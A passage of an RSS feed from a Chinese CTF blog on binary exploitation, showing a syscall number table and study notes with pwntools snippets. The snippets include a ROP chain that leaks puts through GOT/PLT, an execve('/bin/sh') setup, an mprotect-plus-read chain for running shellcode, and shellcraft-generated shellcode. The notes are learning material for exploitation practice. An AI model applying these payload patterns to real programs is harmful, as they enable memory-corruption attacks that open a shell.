20&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_access 21&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_pipe 22&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_select 23&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_sched_yield 24&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_mremap 25&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_msync 26&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_mincore 27&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_madvise 28&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_shmget 29&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_shmat 30&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_shmctl 31&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_dup 32&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_dup2 33&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_pause 34&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_nanosleep 35&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_getitimer 36&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_alarm 37&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_setitimer 38&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;43&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_getpid 39&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;44&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_sendfile 40&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;45&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_socket 41&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;46&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_connect 42&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;47&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_accept 43&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;48&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_sendto 44&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;49&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_recvfrom 45&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;50&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_sendmsg 46&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;51&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_recvmsg 47&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;52&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_shutdown 48&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;53&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_bind 49&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;54&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_listen 50&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;55&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_getsockname 51&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;56&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_getpeername 52&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;57&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_socketpair 53&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;58&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_setsockopt 54&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;59&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_getsockopt 55&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;60&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_clone 56&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;61&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_fork 57&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;62&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_vfork 58&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;63&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_execve 59&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;64&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;#define __NR_exit 60&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;完整系统调用号:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3QuY3Nkbi5jbi9kcnN5eQ==&#34;&gt;http://t.csdn.cn/drsyy&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;2寄存器传参不同上面已经说明过了&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2寄存器传参不同上面已经说明过了&#34;&gt;#&lt;/a&gt; 2. 寄存器传参不同 (上面已经说明过了)&lt;/h3&gt;
&lt;h3 id=&#34;3进行系统调用方式不同&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3进行系统调用方式不同&#34;&gt;#&lt;/a&gt; 3. 进行系统调用方式不同&lt;/h3&gt;
&lt;p&gt;32 位系统通过 ** int 0x80 ** 中断进入系统调用&lt;/p&gt;
&lt;p&gt;64 位系统通过 ** syscall ** 命令进入系统调用&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3QuY3Nkbi5jbi9KejZIbQ==&#34;&gt;http://t.csdn.cn/Jz6Hm&lt;/span&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://vvwwvv.cn/2023/08/24/pwn/%E5%A0%86/%E5%A0%86/</guid>
            <title>堆</title>
            <link>https://vvwwvv.cn/2023/08/24/pwn/%E5%A0%86/%E5%A0%86/</link>
            <category>pwn</category>
            <category>二进制</category>
            <category>Linux</category>
            <pubDate>Thu, 24 Aug 2023 20:15:56 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;chunk 的 p 位设为 1 即上一个 chunk 被使用并且上一个 chunk 可以使用 pre_size 的空间  （用来储存前一个物理相邻的 chunk 的数据 ，（两个都空闲才合并）&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://vvwwvv.cn/2023/08/24/pwn/PWN%E9%9B%B6%E7%A2%8E%E7%9F%A5%E8%AF%86/</guid>
            <title>PWN零碎知识</title>
            <link>https://vvwwvv.cn/2023/08/24/pwn/PWN%E9%9B%B6%E7%A2%8E%E7%9F%A5%E8%AF%86/</link>
            <category>pwn</category>
            <category>二进制</category>
            <pubDate>Thu, 24 Aug 2023 19:23:15 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;centerpwn零碎知识center&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#centerpwn零碎知识center&#34;&gt;#&lt;/a&gt; &amp;lt;center&amp;gt;PWN 零碎知识 &amp;lt;/center&amp;gt;&lt;/h1&gt;
&lt;h3 id=&#34;164位程序与32位程序payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#164位程序与32位程序payload&#34;&gt;#&lt;/a&gt; 1.64 位程序与 32 位程序 payload&lt;/h3&gt;
&lt;p&gt;​&lt;br /&gt;
64 位程序 payload 要先用 pop_rdi 覆盖 ret 然后依次是 调用函数的参数，调用函数本身，最后是返回地址（32 位程序传参不需要用寄存器）&lt;br /&gt;
32 位程序是调用函数 &lt;strong&gt;先函数本身&lt;/strong&gt; ，然后是函数返回地址，再是参数&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;span&gt;n&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#34;\x00&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x50&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;rdi_ret&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;put_got&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;put_plt&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x4009A0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;pre&gt;&lt;code&gt;先是垃圾字符，然后pop_rdi,接着put_got是利用执行put_plt泄露的地址，最后是返回地址
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;2注意栈对齐ubuntu18以上格外注意&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2注意栈对齐ubuntu18以上格外注意&#34;&gt;#&lt;/a&gt; 2. 注意栈对齐（Ubuntu18 以上格外注意）&lt;/h3&gt;
&lt;h3 id=&#34;3泄露的函数接收时需要看其最后返回地址的函数是否有输出字符串如有则先接收返回地址输出的字符串&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3泄露的函数接收时需要看其最后返回地址的函数是否有输出字符串如有则先接收返回地址输出的字符串&#34;&gt;#&lt;/a&gt; 3. 泄露的函数接收时，需要看其最后返回地址的函数是否有输出字符串，如有则先接收返回地址输出的字符串&lt;/h3&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;span&gt;n&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#34;\x00&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x50&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;rdi_ret&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;put_got&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;put_plt&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;返回地址&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendlineafter&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Input your Plaintext to be encrypted\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;#返回地址中输出的字符串&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;#返回地址中输出的字符串&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    puts&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;u64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;\n&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ljust&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;\0&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    puts&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;u64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recv&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ljust&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;\x00&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;【有时会直接输出地址以 16 进制形式，我们要直接进行接收】&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;span&gt;c&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Yippie, lets crash: %p\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; s&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;// 例如这种输出&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;接收方式：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;span&gt;n&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;stack&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recv&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;#接收回显的参数在栈上的地址，长度是 10，以 16 进制表示&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;4有时接收不能用u64precv会出错利用-u64precvuntilbn-1ljust8b0&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4有时接收不能用u64precv会出错利用-u64precvuntilbn-1ljust8b0&#34;&gt;#&lt;/a&gt; 4. 有时接收不能用 u64 (p.recv ()), 会出错，利用 u64 (p.recvuntil (b&#39;\n&#39;)[:-1].ljust (8,b&#39;\0&#39;))&lt;/h3&gt;
&lt;h3 id=&#34;5遇到要绕过strlen函数要绕过时用-bx00-截断&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#5遇到要绕过strlen函数要绕过时用-bx00-截断&#34;&gt;#&lt;/a&gt; 5. 遇到要绕过 strlen 函数要绕过时用 b&amp;quot;\x00&amp;quot; 截断&lt;/h3&gt;
&lt;h3 id=&#34;6系统调用是调用execvebinshnullnull平常调用为systembinsh&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#6系统调用是调用execvebinshnullnull平常调用为systembinsh&#34;&gt;#&lt;/a&gt; 6. 系统调用是调用 execve (&amp;quot;/bin/sh&amp;quot;,NULL,NULL)【平常调用为 system (&amp;quot;/bin/sh&amp;quot;)】&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;32位程序系统调用号用 eax 储存, 第一 、 二 、 三参数分别在 ebx 、ecx 、edx中储存。 可以用 int 80 汇编指令调用（）

当eax=11时即为系统调用号调用命令execve，参数&amp;quot;/bin/sh&amp;quot;赋给ebx
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://z1.ax1x.com/2023/09/16/pPfQR56.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;64位程序系统调用号用 rax 储存, 第一 、 二 、 三参数分别在 rdi 、rsi 、rdx中储存。 可以用 syscall 汇编指令调用
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;7有mprotect函数可以改变内存的读写权限&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#7有mprotect函数可以改变内存的读写权限&#34;&gt;#&lt;/a&gt; 7. 有 mprotect 函数可以改变内存的读写权限&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;mprotect(起始地址，修改内存长度，修改的权限（修改为7） )

指定的内存区间必须包含整个内存页(4k)，起始地址必须是页的起始地址(末尾为00?),修改区间的长度必须是页的整数倍

mem_addr (起始地址)= 0x80EB000   mem_size(内存长度) = 0x1000   mem_proc(权限) = 0x7 【32位程序时也可以找任意三个寄存器来传参(如pop ebx;pop exi;pop ebp;ret)，为了控制后续的返回地址】

在可以利用执行shellcode时可以用，修改一个位置可执行，然后调用read存入shellcode加以执行

payload=b&amp;quot;a&amp;quot;*0x2d

payload+=p32(mprotect)+p32(pop_ret)+p32(plt_got)+p32(0x100)+p32(0x7)

此处没有覆盖ebp，因为查看汇编ebp还未入栈，所以直接覆盖ret，后面的为调用3个寄存器

payload+=p32(read)+p32(pop_ret)+p32(0)+p32(plt_got)+p32(0x100)+p32(plt_got)

返回地址为read，

此处调用顺序为 执行函数，寄存器_返回地址，参数，函数返回地址(32位程序下，与一般32位不同，一般不调用寄存器)
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;8shellcode编写&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#8shellcode编写&#34;&gt;#&lt;/a&gt; 8.shellcode 编写&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;用pwntools生成：

shellcode = asm(shellcraft.sh())

shellcode网址（用的时候不知道为什么不行）：

[https://www.exploit-db.com/](https://www.exploit-db.com/ &amp;quot;漏洞利用数据库 - 渗透测试人员、研究人员和道德黑客的漏洞利用 (exploit-db.com)&amp;quot;)

[http://shell-storm.org/shellcode/index.html](http://shell-storm.org/shellcode/index.html &amp;quot;Shellcodes database for study cases (shell-storm.org)&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;9strcmp绕过&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#9strcmp绕过&#34;&gt;#&lt;/a&gt; 9.strcmp () 绕过&lt;/h3&gt;
